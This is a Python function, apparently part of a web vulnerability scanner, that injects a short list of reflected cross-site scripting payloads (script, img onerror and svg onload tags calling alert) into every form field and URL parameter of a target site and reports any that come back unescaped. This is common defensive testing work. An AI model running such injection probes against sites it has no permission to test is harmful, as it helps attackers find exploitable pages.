def test_xss(url: str, proxies: Optional[dict] = None) -> None:
    """Tests for Cross-Site Scripting vulnerabilities."""
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"'><script>alert('XSS')</script>",
        "<svg/onload=alert('XSS')>",
    ]

    try:
        response = get_response(url, proxies=proxies)
        if not response: return

        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form in forms:
            action = form.get('action')
            method = form.get('method', 'get').lower()  # Default to GET
            target_url = urljoin(url, action) if action else url

            for payload in xss_payloads:
                data = {}
                for input_tag in form.find_all('input'):
                    input_name = input_tag.get('name')
                    if input_name:
                        data[input_name] = payload


                if method == 'post':
                    response = get_response(target_url, method='POST', data=data, proxies=proxies)
                else: # method == 'get' or default
                    response = get_response(target_url, method='GET', params=data, proxies=proxies)

                if response and payload in response.text:
                    write_report(f"XSS Vulnerability Found: {target_url} with payload: {payload}")
                    return  # Stop after first vulnerability found for this form

        #Test parameters in the URL
        parsed_url = urlparse(url)
        if parsed_url.query: # if there are query parameters
            for payload in xss_payloads:
                for key, value in parse_qs(parsed_url.query).items():
                    #replace the original value with the payload, reconstruct the URL
                    attack_url = url.replace(f"{key}={value[0]}",f"{key}={payload}")
                    response = get_response(attack_url, proxies=proxies)
                    if response and payload in response.text:
                        write_report(f"XSS Vulnerability Found in URL parameter: {attack_url} with payload: {payload}")
                        return

    except Exception as e:
        print(f"{Fore.RED}[-] Error during XSS testing: {e}{Style.RESET_ALL}")

